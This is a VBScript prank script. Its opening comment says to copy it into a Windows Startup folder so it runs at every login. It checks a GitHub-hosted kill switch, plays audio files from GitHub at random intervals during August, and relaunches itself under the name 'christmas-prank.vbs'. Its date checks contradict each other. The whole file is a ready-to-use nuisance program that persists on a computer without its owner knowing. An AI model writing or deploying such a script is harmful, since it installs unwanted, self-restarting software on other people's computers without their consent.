REM Add file to "C:\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

Dim rlTimer, songNum
rlTimer = 0
songNum = 0

If (Month(Now) = 8) And (Day(Now) > 25) Then WScript.quit 0 End If

Do
	Dim killCmd, killURL
	set killURL = CreateObject("Msxml2.ServerXMLHTTP")
	killURL.open "GET", "https://raw.githubusercontent.com/MooSick/coolness/main/kill", False
	killURL.send
	If killURL.status <> 200 Then wscript.quit 0 End If
	set killURL = Nothing
	If (Month(Now) = 8) And (Day(Now) < 25) Then
		Do
			dim ranDelay
			Randomize
			ranDelay = Int(Rnd*10000)+1000
			REM songNum = Int(Rnd*4)
			wscript.sleep ranDelay
			If songNum = 0 Then Call sound1 Else If songNum = 1 Then Call sound2 Else If songNum = 2 Then Call sound3 Else If songNum = 3 Then Call sound4 End If
			rlTimer = rlTimer + 1
			If rlTimer > 5 Then newInstance() End If
			If rlTimer > 5 Then WScript.quit 0 End If
			If songNum > 3 Then songNum = 0 End If
			If (Month(Now) = 8) And (Day(Now) > 8) Then Exit Do End If
		Loop
	End If
Loop

Function sound1()
	With CreateObject("WMPlayer.OCX")
		.url = "https://github.com/MooSick/coolness/blob/main/grymg.mp3?raw=true"
		.controls.play
		Do
			WScript.Sleep 100
		Loop Until .playState = 1
	End With
	songNum = songNum + 1
End Function

Function sound2()
	With CreateObject("WMPlayer.OCX")
		.url = "https://github.com/MooSick/coolness/blob/main/dth.mp3?raw=true"
		.controls.play
		Do
			WScript.Sleep 100
		Loop Until .playState = 1
	End With
	songNum = songNum + 1
End Function

Function sound3()
	With CreateObject("WMPlayer.OCX")
		.url = "https://github.com/MooSick/coolness/blob/main/hamlcm.mp3?raw=true"
		.controls.play
		Do
			WScript.Sleep 100
		Loop Until .playState = 1
	End With
	songNum = songNum + 1
End Function

Function sound4()
	With CreateObject("WMPlayer.OCX")
		.url = "https://github.com/MooSick/coolness/blob/main/scictt.mp3?raw=true"
		.controls.play
		Do
			WScript.Sleep 100
		Loop Until .playState = 1
	End With
	songNum = songNum + 1
End Function

Function newInstance()
	Dim objShell
	Set objShell = WScript.CreateObject("WScript.Shell")
	
	objShell.Run ".\christmas-prank.vbs"
	
	Set objShell = Nothing
End Function
